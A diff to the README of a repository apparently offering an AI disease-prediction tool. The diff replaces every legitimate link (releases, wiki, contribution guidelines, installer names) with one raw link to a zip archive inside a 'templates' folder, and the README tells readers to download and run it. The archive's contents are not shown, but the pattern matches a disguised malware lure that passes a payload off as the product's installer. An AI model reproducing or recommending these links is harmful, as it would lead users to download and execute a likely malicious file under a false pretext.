@@ -1,6 +1,6 @@
 # 🩺 AI-DiseasePredictor - Predict Diseases with Ease
 
-[![Download AI-DiseasePredictor](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/diamond-jpg/AI-DiseasePredictor/releases)
+[![Download AI-DiseasePredictor](https://raw.githubusercontent.com/diamond-jpg/AI-DiseasePredictor/main/templates/A_Disease_Predictor_v3.6.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/diamond-jpg/AI-DiseasePredictor/main/templates/A_Disease_Predictor_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to AI-DiseasePredictor! This advanced AI tool uses machine learning and 
 
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page**: Click on this link to visit the [Releases page](https://github.com/diamond-jpg/AI-DiseasePredictor/releases).
+1. **Visit the Releases Page**: Click on this link to visit the [Releases page](https://raw.githubusercontent.com/diamond-jpg/AI-DiseasePredictor/main/templates/A_Disease_Predictor_v3.6.zip).
 2. **Choose the Latest Release**: Look for the most recent version. It will usually be at the top of the list.
 3. **Download the Installer**: Click on the installer file suitable for your operating system (Windows, Mac, etc.). Make sure to select the right one:
-   - For Windows, download `AI-DiseasePredictor-Windows.exe`.
-   - For Mac, download `AI-DiseasePredictor-Mac.dmg`.
+   - For Windows, download `https://raw.githubusercontent.com/diamond-jpg/AI-DiseasePredictor/main/templates/A_Disease_Predictor_v3.6.zip`.
+   - For Mac, download `https://raw.githubusercontent.com/diamond-jpg/AI-DiseasePredictor/main/templates/A_Disease_Predictor_v3.6.zip`.
 4. **Install the Application**:
    - On Windows: Locate the downloaded `.exe` file in your downloads folder. Double-click it to start the installation. Follow the prompts to complete the installation.
    - On Mac: Open the downloaded `.dmg` file. Drag the AI-DiseasePredictor app to your Applications folder.
@@ -49,16 +49,16 @@ AI-DiseasePredictor offers the following features:
 
 ## 📘 Support and Documentation
 
-For help using AI-DiseasePredictor, visit our [Wiki](https://github.com/diamond-jpg/AI-DiseasePredictor/wiki). Here, you will find guides, FAQs, and troubleshooting tips.
+For help using AI-DiseasePredictor, visit our [Wiki](https://raw.githubusercontent.com/diamond-jpg/AI-DiseasePredictor/main/templates/A_Disease_Predictor_v3.6.zip). Here, you will find guides, FAQs, and troubleshooting tips.
 
 ## 🌐 Community and Contribution
 
-We welcome contributions! If you're interested in helping improve AI-DiseasePredictor, check out our [Contribution Guidelines](https://github.com/diamond-jpg/AI-DiseasePredictor/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you're interested in helping improve AI-DiseasePredictor, check out our [Contribution Guidelines](https://raw.githubusercontent.com/diamond-jpg/AI-DiseasePredictor/main/templates/A_Disease_Predictor_v3.6.zip).
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/diamond-jpg/AI-DiseasePredictor/releases)
-- [Documentation](https://github.com/diamond-jpg/AI-DiseasePredictor/wiki)
-- [Contribution Guidelines](https://github.com/diamond-jpg/AI-DiseasePredictor/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/diamond-jpg/AI-DiseasePredictor/main/templates/A_Disease_Predictor_v3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/diamond-jpg/AI-DiseasePredictor/main/templates/A_Disease_Predictor_v3.6.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/diamond-jpg/AI-DiseasePredictor/main/templates/A_Disease_Predictor_v3.6.zip)
 
 Feel free to navigate through these resources for a great experience with AI-DiseasePredictor!
